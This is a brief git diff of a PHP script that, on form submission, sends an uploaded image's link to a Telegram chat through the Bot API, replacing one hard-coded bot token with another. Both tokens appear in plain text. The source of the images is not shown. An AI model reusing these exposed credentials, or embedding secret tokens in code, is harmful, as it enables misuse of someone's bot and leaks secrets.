@@ -34,7 +34,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 
             // Send the image link to the Telegram API
             $img_url = 'https://ahmhabib01.github.io/Tools/' . $filePath; // Update with your website's URL
-            $telegramUrl = 'https://api.telegram.org/7298508024:AAG_9Ox6hkTxaludyQv9NOgAyM9tXa4LHdk/sendPhoto?chat_id=' . $chat_id . '&parse_mode=HTML&disable_web_page_preview=false&photo=' . $img_url;
+            $telegramUrl = 'https://api.telegram.org/7298508024:AAFhwV60CiHQEJOM7f0FGClpax0idI9E-vg/sendPhoto?chat_id=' . $chat_id . '&parse_mode=HTML&disable_web_page_preview=false&photo=' . $img_url;
 
             // Use cURL to send the request
             $ch = curl_init($telegramUrl);
